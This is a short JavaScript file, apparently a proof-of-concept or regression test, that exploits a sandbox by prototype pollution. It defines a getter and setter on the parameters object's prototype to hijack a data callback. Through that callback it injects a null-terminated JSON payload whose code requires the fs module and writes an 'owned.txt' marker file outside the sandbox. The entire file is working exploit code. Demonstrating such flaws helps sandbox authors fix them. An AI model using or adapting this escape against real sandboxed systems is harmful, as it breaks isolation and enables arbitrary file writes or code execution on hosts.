// A script that exploits a weakness in the sandbox
// by modifying the prototype of a built-in

exports.main = function() {
	var origSubstr = parameters.string.__proto__.substr;
	var payload = "var fs = require('fs');fs.writeFileSync('owned.txt', 'You could have been owned now\\n');exports.api = {};";
	var jsonPayload = JSON.stringify({source:";exports.main = function(){exit('ok')};", sourceAPI:payload});
	var defineGetter = parameters.__defineGetter__;
	var defineSetter = parameters.__defineSetter__;

	defineSetter.call(parameters.__proto__, 'data', function(val) {
		this.__hidden_data = val;
	});
	defineGetter.call(parameters.__proto__, 'data', function() {
		var chained = this.__hidden_data;
		if (typeof chained != "function")
			return chained;
		return function(data) {
			return chained.call(this, jsonPayload + '\u0000');
		};
	});

	exit('ok');
}
